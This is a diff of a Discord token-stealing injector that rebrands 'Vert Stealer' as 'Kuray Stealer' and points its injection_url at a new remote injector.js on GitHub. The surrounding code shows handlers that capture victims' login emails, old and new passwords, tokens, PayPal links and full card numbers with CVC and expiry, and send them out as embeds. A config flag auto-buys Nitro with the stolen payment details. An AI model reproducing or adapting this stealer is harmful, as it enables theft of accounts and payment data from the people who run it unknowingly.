@@ -11,12 +11,12 @@ const config = {
   auto_buy_nitro: true,
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'VERT', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/961950134814535700/961987421879287878/IMG_9854.png'.replace(/ /g, '%20'), 
+  embed_name: 'Kuray INC', 
+  embed_icon: 'https://media.discordapp.net/attachments/1008950062690349116/1010241825228992532/kuraygif.gif'.replace(/ /g, '%20'), 
   embed_color: 8363488,
-  injection_url: 'https://raw.githubusercontent.com/VertX00D/Vert-Stealer/main/Injection/inject.js', 
+  injection_url: 'https://raw.githubusercontent.com/KentMGR/inject.js/main/injector.js', 
   /**
-   * BY VERT STEALER.
+   * BY Kuray Stealer.
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: 'Kuray Stealer',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: 'Kuray Stealer',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: 'Kuray Stealer',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: 'Kuray Stealer',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: 'Kuray Stealer',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: 'Kuray Stealer',
         },
       },
     ],
